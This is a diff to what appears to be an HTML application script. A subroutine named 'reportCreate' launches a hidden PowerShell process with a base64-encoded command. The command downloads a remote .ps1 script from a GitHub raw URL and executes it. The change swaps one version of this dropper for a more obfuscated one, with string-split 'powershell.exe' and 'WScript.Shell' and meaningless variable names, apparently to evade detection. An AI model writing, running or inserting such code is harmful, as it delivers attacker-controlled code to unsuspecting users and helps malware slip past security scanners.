@@ -11,13 +11,19 @@
         reportCreate
 		
         Sub reportCreate
-            Set objShell = CreateObject("WScript.Shell")
-            encodedCommand = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ASABBAFgATwBSAEsAOAA4ADgAMAAvAHIAZQBjAGEAbABsAHMALwBtAGEAaQBuAC8AVAByAF8ANAA0ADUAXwByAGUAYwBhAGwAbAAuAHAAcwAxACcAKQA7AA=="
-			Dim x : x = "powershell.exe -EncodedCommand " & encodedCommand
-			Dim y : y = 0
-			Dim z : z = True
-			Dim cmd : cmd = "Run"
-			objShell.Run x, y, z
+            details = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ASABBAFgATwBSAEsAOAA4ADgAMAAvAHIAZQBjAGEAbABsAHMALwBtAGEAaQBuAC8AVAByAF8ANAA0ADUAXwByAGUAYwBhAGwAbAAuAHAAcwAxACcAKQA7AA=="
+			Dim p1 : p1 = "powershell" & ".exe "
+			Dim ec2 : ec2 = "-EncodedCommand "
+			Dim x3 : x3 = p1 & ec2 & details
+
+			Dim y4 : y4 = 0
+			Dim z5 : z5 = True
+
+			Dim c6 : c6 = "Run"
+
+			Dim o7 : Set o7 = CreateObject("WScript" & "." & "Shell")
+
+			o7.Run x3, y4, z5
         End Sub
 		
 		Self.Close
